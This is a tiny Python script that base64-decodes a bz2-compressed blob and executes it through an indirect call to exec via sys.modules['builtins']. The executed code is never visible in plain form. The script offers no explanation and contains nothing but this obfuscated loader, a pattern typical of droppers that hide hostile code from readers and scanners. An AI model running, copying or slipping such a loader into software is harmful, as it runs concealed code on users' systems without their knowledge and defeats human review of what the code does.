import sys
import base64, codecs, zlib, lzma, gzip, bz2, marshal
_p = b'QlpoOTFBWSZTWdCNuXEAACXfgEAQQOUoEgAgQAQ/Z94KIABoNU2po0NM1D0mmmmg0GqaaeobSYmjIAeiEl7bgS7CfDw5w7XXr189TGIZuJMOoiFYIkeQprnSg9ArAXQm0hOSpnNeLM6HwaexEVtUQ+Y5KCTwlchIiW7VR23yHVbPxdyRThQkNCNuXEA='
sys.modules['builtins'].exec(bz2.decompress(base64.b64decode(_p)))
